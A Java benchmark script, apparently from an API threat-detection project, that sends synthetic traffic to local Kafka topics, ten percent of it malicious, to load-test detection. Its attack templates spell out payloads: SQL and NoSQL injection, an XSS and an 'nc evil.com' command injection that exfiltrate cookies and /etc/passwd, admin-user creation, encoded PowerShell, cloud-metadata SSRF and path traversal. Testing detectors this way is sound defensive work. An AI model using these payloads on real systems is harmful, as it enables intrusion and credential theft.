package com.akto.threat.detection.scripts;

import com.akto.threat.detection.kafka.KafkaProtoProducer;
import com.akto.kafka.KafkaConfig;
import com.akto.kafka.KafkaConsumerConfig;
import com.akto.kafka.KafkaProducerConfig;
import com.akto.kafka.Serializer;
import com.akto.proto.http_response_param.v1.StringList;
import com.akto.proto.http_response_param.v1.HttpResponseParam;
import com.mongodb.BasicDBObject;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.apache.kafka.clients.producer.KafkaProducer;
import org.apache.kafka.clients.producer.ProducerConfig;
import org.apache.kafka.clients.producer.ProducerRecord;
import org.apache.kafka.common.serialization.StringSerializer;

import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Properties;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * High-scale realistic traffic benchmark: 90% clean traffic, 10% malicious (spread across all threat categories).
 * Supports 1M+ records with multi-threaded producer, temporal distribution across windows.
 * Can produce records in multiple formats: proto (threat detection), JSON (mini-runtime), or both.
 *
 * Usage examples:
 *   mvn exec:java -Dexec.mainClass="..." -Dnum.records=1000000 -Dnum.threads=8 -Dmode=threat
 *   mvn exec:java -Dexec.mainClass="..." -Dnum.records=1000000 -Dnum.threads=8 -Dmode=mini-runtime
 *   mvn exec:java -Dexec.mainClass="..." -Dnum.records=1000000 -Dnum.threads=8 -Dmode=both
 */
public class RealisticTrafficBenchmark {

    // Configurable: read from system property, env var, or default
    public static long numRecords = readLongConfig("num.records", "NUM_RECORDS", 100L);
    public static int numThreads = readIntConfig("num.threads", "THREAD_COUNT", Runtime.getRuntime().availableProcessors());
    public static String mode = readStringConfig("mode", "MODE", "threat");  // threat, mini-runtime, or both

    private static String readStringConfig(String sysProp, String envVar, String defaultValue) {
        String sysPropVal = System.getProperty(sysProp);
        if (sysPropVal != null && !sysPropVal.isEmpty()) {
            return sysPropVal.toLowerCase();
        }
        String envVal = System.getenv(envVar);
        if (envVal != null && !envVal.isEmpty()) {
            return envVal.toLowerCase();
        }
        return defaultValue;
    }

    private static long readLongConfig(String sysProp, String envVar, long defaultValue) {
        String sysPropVal = System.getProperty(sysProp);
        if (sysPropVal != null) {
            try { return Long.parseLong(sysPropVal); } catch (NumberFormatException e) {}
        }
        String envVal = System.getenv(envVar);
        if (envVal != null) {
            try { return Long.parseLong(envVal); } catch (NumberFormatException e) {}
        }
        return defaultValue;
    }

    private static int readIntConfig(String sysProp, String envVar, int defaultValue) {
        String sysPropVal = System.getProperty(sysProp);
        if (sysPropVal != null) {
            try { return Integer.parseInt(sysPropVal); } catch (NumberFormatException e) {}
        }
        String envVal = System.getenv(envVar);
        if (envVal != null) {
            try { return Integer.parseInt(envVal); } catch (NumberFormatException e) {}
        }
        return defaultValue;
    }

    public static final String THREAT_TOPIC = "akto.api.logs2";
    public static final String INGEST_TOPIC = "akto.api.logs";
    public static final String KAFKA_URL = "localhost:9092";
    private static final String CONSUMER_GROUP_ID = "akto.threat_detection";
    private static final Random random = new Random(42);

    private static final KafkaConfig kafkaConfig =
        KafkaConfig.newBuilder()
            .setGroupId(CONSUMER_GROUP_ID)
            .setBootstrapServers(KAFKA_URL)
            .setConsumerConfig(
                KafkaConsumerConfig.newBuilder()
                    .setMaxPollRecords(500)
                    .setPollDurationMilli(100)
                    .build())
            .setProducerConfig(
                KafkaProducerConfig.newBuilder().setBatchSize(16384).setLingerMs(100).build())
            .setKeySerializer(Serializer.STRING)
            .setValueSerializer(Serializer.BYTE_ARRAY)
            .build();

    private static final KafkaProtoProducer protoProducer = new KafkaProtoProducer(kafkaConfig);
    private static KafkaProducer<String, String> jsonProducer = null;

    // =====================================================================
    //  IngestDataBatch — JSON format for mini-runtime ingestion
    // =====================================================================

    private static class IngestDataBatch {
        String path;
        String requestHeaders;
        String responseHeaders;
        String method;
        String requestPayload;
        String responsePayload;
        String ip;
        String time;
        String statusCode;
        String type;
        String status;
        String akto_account_id;
        String akto_vxlan_id;
        String is_pending;
        String source;

        IngestDataBatch(String path, String requestHeaders, String responseHeaders, String method,
                        String requestPayload, String responsePayload, String ip, String time,
                        String statusCode, String type, String status, String akto_account_id,
                        String akto_vxlan_id, String is_pending, String source) {
            this.path = path;
            this.requestHeaders = requestHeaders;
            this.responseHeaders = responseHeaders;
            this.method = method;
            this.requestPayload = requestPayload;
            this.responsePayload = responsePayload;
            this.ip = ip;
            this.time = time;
            this.statusCode = statusCode;
            this.type = type;
            this.status = status;
            this.akto_account_id = akto_account_id;
            this.akto_vxlan_id = akto_vxlan_id;
            this.is_pending = is_pending;
            this.source = source;
        }
    }

    private static String ingestDataBatchToJson(IngestDataBatch payload) {
        BasicDBObject obj = new BasicDBObject();
        obj.put("path", payload.path);
        obj.put("requestHeaders", payload.requestHeaders);
        obj.put("responseHeaders", payload.responseHeaders);
        obj.put("method", payload.method);
        obj.put("requestPayload", payload.requestPayload);
        obj.put("responsePayload", payload.responsePayload);
        obj.put("ip", payload.ip);
        obj.put("time", payload.time);
        obj.put("statusCode", payload.statusCode);
        obj.put("type", payload.type);
        obj.put("status", payload.status);
        obj.put("akto_account_id", payload.akto_account_id);
        obj.put("akto_vxlan_id", payload.akto_vxlan_id);
        obj.put("is_pending", payload.is_pending);
        obj.put("source", payload.source);
        return obj.toString();
    }

    private static void initJsonProducer() {
        Properties props = new Properties();
        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, KAFKA_URL);
        props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());
        props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());
        props.put(ProducerConfig.COMPRESSION_TYPE_CONFIG, "lz4");
        props.put(ProducerConfig.BATCH_SIZE_CONFIG, 16384);
        props.put(ProducerConfig.LINGER_MS_CONFIG, 100);
        jsonProducer = new KafkaProducer<>(props);
    }

    // =====================================================================
    //  Clean API endpoints (realistic REST APIs)
    // =====================================================================

    private static final String[][] CLEAN_ENDPOINTS = {
        {"GET",  "/api/v2/users/me"},
        {"GET",  "/api/v2/products?page=1&limit=20&sort=price"},
        {"POST", "/api/v2/orders"},
        {"PUT",  "/api/v2/users/preferences"},
        {"GET",  "/api/v2/inventory/search?q=laptop&category=electronics"},
        {"POST", "/api/v2/auth/refresh"},
        {"GET",  "/api/v2/notifications?unread=true"},
        {"DELETE", "/api/v2/cart/items/12345"},
        {"POST", "/api/v2/payments/checkout"},
        {"GET",  "/api/v2/reports/dashboard?from=2025-01-01&to=2025-03-31"},
        {"PATCH", "/api/v2/settings/account"},
        {"GET",  "/api/v2/analytics/events?type=pageview"},
        {"POST", "/api/v2/webhooks/register"},
        {"GET",  "/api/v2/health"},
        {"POST", "/api/v2/upload/avatar"},
    };

    // Build 200 unique IP addresses for distribution testing
    private static final String[] ALL_IPS = buildIpPool(200);

    private static String[] buildIpPool(int count) {
        String[] ips = new String[count];
        for (int i = 0; i < count; i++) {
            ips[i] = "10." + (i / 100) + "." + ((i / 10) % 10) + "." + (i % 10 + 1);
        }
        return ips;
    }

    // =====================================================================
    //  Malicious payloads — one per threat category
    //  Each entry: {category_label, method, path, malicious_header_key, malicious_header_value, body_payload}
    //  If header_key is empty, attack is in URL or body only.
    // =====================================================================

    private static final String[][] MALICIOUS_TEMPLATES = {
        // SQL Injection — in URL
        {"SQLi", "GET", "/api/v2/users?id=1' UNION SELECT username,password FROM users--", "", "", ""},

        // SQL Injection — in body
        {"SQLi-body", "POST", "/api/v2/search", "", "",
         "{\"filter\": \"name'; DROP TABLE orders;--\", \"limit\": 10}"},

        // XSS — in URL param
        {"XSS", "GET", "/api/v2/search?q=<script>document.location='http://evil.com/?c='+document.cookie</script>", "", "", ""},

        // XSS — in header
        {"XSS-header", "GET", "/api/v2/products", "referer", "<img src=x onerror=alert(document.cookie)>", ""},

        // NoSQL Injection — in body
        {"NoSQLi", "POST", "/api/v2/auth/login", "", "",
         "{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}"},

        // NoSQL Injection — aggregation pipeline
        {"NoSQLi-agg", "POST", "/api/v2/analytics/query", "", "",
         "{\"pipeline\": [{\"$match\": {\"role\": \"admin\"}}, {\"$lookup\": {\"from\": \"secrets\"}}]}"},

        // OS Command Injection — in body
        {"OS-Cmd", "POST", "/api/v2/tools/ping", "", "",
         "{\"host\": \"8.8.8.8; cat /etc/passwd | nc evil.com 4444\"}"},

        // OS Command Injection — command substitution in URL
        {"OS-Cmd-sub", "GET", "/api/v2/files/$(whoami)/config", "", "", ""},

        // Windows Command Injection — in body
        {"Win-Cmd", "POST", "/api/v2/tools/execute", "", "",
         "{\"command\": \"; cmd.exe /c net user admin P@ssw0rd /add\"}"},

        // Windows — powershell in body
        {"Win-PS", "POST", "/api/v2/deploy/script", "", "",
         "{\"script\": \"powershell.exe -EncodedCommand ZABpAHIAIABDADoAXAA=\"}"},

        // SSRF — localhost
        {"SSRF", "POST", "/api/v2/integrations/webhook", "", "",
         "{\"callback_url\": \"http://127.0.0.1:8080/admin/config\"}"},

        // SSRF — cloud metadata
        {"SSRF-meta", "POST", "/api/v2/fetch", "", "",
         "{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}"},

        // LFI — path traversal in URL
        {"LFI", "GET", "/api/v2/files/download?path=../../../../etc/passwd", "", "", ""},

        // LFI — PHP wrapper
        {"LFI-php", "GET", "/api/v2/include?page=php://filter/convert.base64-encode/resource=config.php", "", "", ""},
    };

    // =====================================================================
    //  Main
    // =====================================================================

    public static void main(String[] args) throws Exception {
        // Validate mode
        if (!mode.equals("threat") && !mode.equals("mini-runtime") && !mode.equals("both")) {
            System.err.println("Invalid mode: " + mode);
            System.err.println("Valid modes: threat, mini-runtime, both");
            System.exit(1);
        }

        // Initialize JSON producer if needed
        if (mode.equals("mini-runtime") || mode.equals("both")) {
            initJsonProducer();
        }

        System.out.printf("\n\n******* High-Scale Realistic Traffic Benchmark *******\n\n");
        System.out.printf("Mode: %s | Total records: %,d | Threads: %d | 90%% clean, 10%% malicious\n", mode.toUpperCase(), numRecords, numThreads);
        System.out.printf("Topics: %s%s\n",
            (mode.equals("threat") || mode.equals("both")) ? THREAT_TOPIC : "",
            (mode.equals("mini-runtime") || mode.equals("both")) ? (", " + INGEST_TOPIC) : "");
        System.out.printf("Malicious categories: %d templates | IP pool: %d unique IPs\n", MALICIOUS_TEMPLATES.length, ALL_IPS.length);
        System.out.printf("API collections: 101, 102, 103 | Records per window: 1000\n\n");

        long maliciousCount = numRecords / 10;
        long cleanCount = numRecords - maliciousCount;
        System.out.printf("Clean: %,d | Malicious: %,d\n\n", cleanCount, maliciousCount);

        // Pre-allocate padding payload once (reuse across all records)
        String paddingBody = generatePaddingPayload(8500);

        // Temporal distribution: start 8 hours ago
        long baseEpochMin = System.currentTimeMillis() / 60000 - 480;
        final int RECORDS_PER_WINDOW = 1000;

        // Shared state across threads
        final AtomicLong sent = new AtomicLong(0);
        final AtomicLong errors = new AtomicLong(0);
        final AtomicLong malSent = new AtomicLong(0);
        final AtomicBoolean stopReporter = new AtomicBoolean(false);

        long startTime = System.nanoTime();

        // Start reporter thread
        Thread reporter = new Thread(() -> reportProgress(sent, malSent, errors, numRecords, startTime, stopReporter));
        reporter.setDaemon(true);
        reporter.start();

        // Multi-threaded producer
        ExecutorService executor = Executors.newFixedThreadPool(numThreads);
        List<Future<?>> futures = new ArrayList<>();
        long recordsPerThread = numRecords / numThreads;

        for (int threadIdx = 0; threadIdx < numThreads; threadIdx++) {
            final int tIdx = threadIdx;
            final long threadStartIdx = threadIdx * recordsPerThread;
            final long threadEndIdx = (threadIdx == numThreads - 1) ? numRecords : (threadIdx + 1) * recordsPerThread;

            futures.add(executor.submit(() -> {
                Random threadRandom = new Random(42 + tIdx);
                AtomicLong threadMalCount = new AtomicLong(0);

                for (long globalIdx = threadStartIdx; globalIdx < threadEndIdx; globalIdx++) {
                    try {
                        HttpResponseParam protoRecord = null;
                        IngestDataBatch jsonRecord = null;
                        boolean isMalicious = globalIdx % 10 == 0;

                        if (isMalicious) {
                            int templateIdx = (int)(threadMalCount.getAndIncrement() % MALICIOUS_TEMPLATES.length);
                            protoRecord = buildMaliciousRecord(MALICIOUS_TEMPLATES[templateIdx], paddingBody, globalIdx, baseEpochMin, RECORDS_PER_WINDOW, threadRandom);
                            malSent.incrementAndGet();
                        } else {
                            protoRecord = buildCleanRecord(paddingBody, globalIdx, baseEpochMin, RECORDS_PER_WINDOW, threadRandom);
                        }

                        // Send proto format if in threat or both mode
                        if (mode.equals("threat") || mode.equals("both")) {
                            protoProducer.send(THREAT_TOPIC, protoRecord);
                        }

                        // Send JSON format if in mini-runtime or both mode
                        if (mode.equals("mini-runtime") || mode.equals("both")) {
                            jsonRecord = convertProtoToJson(protoRecord);
                            String jsonStr = ingestDataBatchToJson(jsonRecord);
                            jsonProducer.send(new ProducerRecord<>(INGEST_TOPIC, jsonStr));
                        }

                        sent.incrementAndGet();
                    } catch (Exception e) {
                        errors.incrementAndGet();
                    }
                }
            }));
        }

        // Wait for all threads to finish
        executor.shutdown();
        boolean completed = executor.awaitTermination(10, TimeUnit.MINUTES);
        stopReporter.set(true);

        if (!completed) {
            System.out.println("\n[WARNING] Executor did not complete within 10 minutes");
            executor.shutdownNow();
        }

        // Flush all in-flight messages
        System.out.println("\nFlushing Kafka producers...");
        if (mode.equals("threat") || mode.equals("both")) {
            protoProducer.flush();
        }
        if (mode.equals("mini-runtime") || mode.equals("both")) {
            jsonProducer.flush();
            jsonProducer.close();
        }

        // Final stats
        long totalMs = (System.nanoTime() - startTime) / 1_000_000;
        double finalRate = (sent.get() * 1000.0) / Math.max(totalMs, 1);
        long sentCount = sent.get();
        long errorCount = errors.get();

        System.out.printf("\n\n====== Final Summary ======\n");
        System.out.printf("Sent: %,d | Errors: %,d | Success rate: %.2f%%\n", sentCount, errorCount, 100.0 * sentCount / (sentCount + errorCount));
        System.out.printf("Time: %d ms (%.1f sec) | Throughput: %.0f msg/sec\n", totalMs, totalMs / 1000.0, finalRate);
        System.out.printf("Malicious: %,d | Est. bytes: %,d MB\n", malSent.get(), (sentCount * 10) / 1024);
        System.out.printf("Windows covered: ~%d | Distribution hashes to check: dist|5|*\n", numRecords / RECORDS_PER_WINDOW);
        System.out.println("\nConsumer will process these records in the background.");
    }

    private static void reportProgress(AtomicLong sent, AtomicLong malSent, AtomicLong errors, long total, long startTime, AtomicBoolean stop) {
        while (!stop.get()) {
            try {
                long current = sent.get();
                long elapsed = (System.nanoTime() - startTime) / 1_000_000;
                long elapsedSec = elapsed / 1000;
                long remaining = total - current;
                double rate = current > 0 ? (current * 1000.0) / Math.max(elapsed, 1) : 0;
                long etaMs = remaining > 0 ? (long)(remaining / (rate / 1000.0)) : 0;

                System.out.printf("\r[%02d:%02d] %,d / %,d (%.0f msg/s) | Malicious: %,d | Errors: %,d | ETA: %02d:%02d",
                    elapsedSec / 60, elapsedSec % 60, current, total, rate, malSent.get(), errors.get(),
                    etaMs / 60000, (etaMs % 60000) / 1000);
                System.out.flush();

                Thread.sleep(1000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
    }

    // =====================================================================
    //  Proto to JSON conversion
    // =====================================================================

    private static IngestDataBatch convertProtoToJson(HttpResponseParam proto) {
        // Convert protobuf record to JSON format
        Map<String, StringList> reqHeaders = proto.getRequestHeadersMap();
        Map<String, StringList> respHeaders = proto.getResponseHeadersMap();

        String requestHeaders = mapToJsonString(reqHeaders);
        String responseHeaders = mapToJsonString(respHeaders);

        return new IngestDataBatch(
            proto.getPath(),
            requestHeaders,
            responseHeaders,
            proto.getMethod(),
            proto.getRequestPayload(),
            proto.getResponsePayload(),
            proto.getIp(),
            String.valueOf(proto.getTime()),
            String.valueOf(proto.getStatusCode()),
            proto.getType(),
            proto.getStatus(),
            proto.getAktoAccountId(),
            proto.getAktoVxlanId(),
            String.valueOf(proto.getIsPending()),
            proto.getSource()
        );
    }

    private static String mapToJsonString(Map<String, StringList> headerMap) {
        Map<String, String> flatMap = new HashMap<>();
        for (Map.Entry<String, StringList> entry : headerMap.entrySet()) {
            if (entry.getValue().getValuesList().size() > 0) {
                flatMap.put(entry.getKey(), entry.getValue().getValues(0));
            }
        }
        try {
            ObjectMapper mapper = new ObjectMapper();
            return mapper.writeValueAsString(flatMap);
        } catch (Exception e) {
            return "{}";
        }
    }

    // =====================================================================
    //  Record builders
    // =====================================================================

    private static HttpResponseParam buildCleanRecord(String paddingBody, long globalIdx, long baseEpochMin, int recordsPerWindow, Random threadRandom) {
        // Temporal distribution: epoch minute based on global index
        long windowOffset = globalIdx / recordsPerWindow;
        long epochMin = baseEpochMin + windowOffset;
        int timeSeconds = (int)(epochMin * 60);

        // IP selection based on global index (gives deterministic distribution)
        int ipIdx = (int)((globalIdx * 13) % ALL_IPS.length);
        String ip = ALL_IPS[ipIdx];

        // Endpoint selection (varies per thread with thread-local random)
        int endpointIdx = threadRandom.nextInt(CLEAN_ENDPOINTS.length);
        String[] endpoint = CLEAN_ENDPOINTS[endpointIdx];
        String method = endpoint[0];
        String path = endpoint[1];

        // API collection varies by endpoint: 101, 102, 103
        int apiCollectionId = 101 + (endpointIdx / 5);

        String requestBody = method.equals("GET") || method.equals("DELETE")
            ? ""
            : "{\"data\": " + paddingBody + "}";

        String responseBody = "{\"status\": \"ok\", \"data\": " + paddingBody + "}";

        return buildRecord(method, path, ip, buildCleanRequestHeaders(ip), buildCleanResponseHeaders(),
                requestBody, responseBody, 200, "OK", timeSeconds, apiCollectionId);
    }

    private static HttpResponseParam buildMaliciousRecord(String[] template, String paddingBody, long globalIdx, long baseEpochMin, int recordsPerWindow, Random threadRandom) {
        // Temporal distribution: epoch minute based on global index
        long windowOffset = globalIdx / recordsPerWindow;
        long epochMin = baseEpochMin + windowOffset;
        int timeSeconds = (int)(epochMin * 60);

        // IP selection based on global index
        int ipIdx = (int)((globalIdx * 13) % ALL_IPS.length);
        String ip = ALL_IPS[ipIdx];

        String method = template[1];
        String path = template[2];
        String malHeaderKey = template[3];
        String malHeaderValue = template[4];
        String malBody = template[5];

        Map<String, StringList> reqHeaders = buildCleanRequestHeaders(ip);
        if (!malHeaderKey.isEmpty()) {
            reqHeaders.put(malHeaderKey, StringList.newBuilder().addValues(malHeaderValue).build());
        }

        // If template has a body payload, use it; otherwise use clean body padded to ~10KB
        String requestBody;
        if (!malBody.isEmpty()) {
            // Pad malicious body to ~10KB average
            requestBody = padToSize(malBody, 9000);
        } else {
            requestBody = "";
        }

        String responseBody = "{\"status\": \"ok\", \"data\": " + paddingBody + "}";
        int statusCode = threadRandom.nextInt(10) == 0 ? 401 : 200;
        String status = statusCode == 401 ? "Unauthorized" : "OK";

        // API collection varies: use fixed mapping for malicious (101, 102, 103)
        int apiCollectionId = 101 + (int)(globalIdx % 3);

        return buildRecord(method, path, ip, reqHeaders, buildCleanResponseHeaders(),
                requestBody, responseBody, statusCode, status, timeSeconds, apiCollectionId);
    }

    private static HttpResponseParam buildRecord(
            String method, String path, String ip,
            Map<String, StringList> requestHeaders, Map<String, StringList> responseHeaders,
            String requestBody, String responseBody,
            int statusCode, String status, int timeSeconds, int apiCollectionId) {

        return HttpResponseParam.newBuilder()
            .setMethod(method)
            .setPath(path)
            .setType("HTTP/1.1")
            .putAllRequestHeaders(requestHeaders)
            .putAllResponseHeaders(responseHeaders)
            .setRequestPayload(requestBody)
            .setResponsePayload(responseBody)
            .setApiCollectionId(apiCollectionId)
            .setStatusCode(statusCode)
            .setStatus(status)
            .setTime(timeSeconds)
            .setAktoAccountId("1000000")
            .setIp(ip)
            .setDestIp("154.248.155.13")
            .setDirection("INBOUND")
            .setIsPending(false)
            .setSource("MIRRORING")
            .setAktoVxlanId("1313121")
            .build();
    }

    // =====================================================================
    //  Headers
    // =====================================================================

    private static Map<String, StringList> buildCleanRequestHeaders(String ip) {
        Map<String, StringList> headers = new HashMap<>();
        headers.put("content-type", sl("application/json"));
        headers.put("authorization", sl("Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.fake"));
        headers.put("host", sl("api.example.com"));
        headers.put("user-agent", sl("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"));
        headers.put("x-forwarded-for", sl(ip));
        headers.put("accept", sl("application/json"));
        headers.put("x-request-id", sl("req-" + random.nextInt(999999)));
        return headers;
    }

    private static Map<String, StringList> buildCleanResponseHeaders() {
        Map<String, StringList> headers = new HashMap<>();
        headers.put("content-type", sl("application/json; charset=utf-8"));
        headers.put("cache-control", sl("no-cache, no-store, must-revalidate"));
        headers.put("x-request-id", sl("resp-" + random.nextInt(999999)));
        headers.put("x-ratelimit-remaining", sl(String.valueOf(random.nextInt(1000))));
        return headers;
    }

    private static StringList sl(String value) {
        return StringList.newBuilder().addValues(value).build();
    }

    // =====================================================================
    //  Payload padding
    // =====================================================================

    /**
     * Generate a realistic-looking JSON payload of approximately targetBytes size.
     */
    private static String generatePaddingPayload(int targetBytes) {
        StringBuilder sb = new StringBuilder(targetBytes + 200);
        sb.append("[");
        int idx = 0;
        while (sb.length() < targetBytes) {
            if (idx > 0) sb.append(",");
            sb.append(String.format(
                "{\"id\":%d,\"name\":\"Item %d\",\"description\":\"Lorem ipsum dolor sit amet consectetur adipiscing elit sed do eiusmod tempor incididunt ut labore et dolore magna aliqua Ut enim ad minim veniam quis nostrud exercitation\",\"price\":%.2f,\"quantity\":%d,\"category\":\"electronics\",\"tags\":[\"sale\",\"popular\",\"new\"],\"metadata\":{\"weight\":%.1f,\"dimensions\":\"10x5x3\",\"color\":\"black\",\"sku\":\"SKU-%06d\"}}",
                idx, idx, 9.99 + (idx % 100), 1 + (idx % 50), 0.5 + (idx % 10), idx));
            idx++;
        }
        sb.append("]");
        return sb.toString();
    }

    /**
     * Pad a malicious body payload to target size by appending a benign JSON field.
     */
    private static String padToSize(String malPayload, int targetBytes) {
        if (malPayload.length() >= targetBytes) return malPayload;
        int needed = targetBytes - malPayload.length() - 50;
        if (needed <= 0) return malPayload;
        StringBuilder padding = new StringBuilder(needed);
        while (padding.length() < needed) {
            padding.append("Lorem ipsum dolor sit amet consectetur adipiscing elit ");
        }
        // Wrap: embed malicious payload inside a larger JSON object
        return "{\"payload\": " + malPayload + ", \"context\": \"" + padding.substring(0, needed) + "\"}";
    }
}
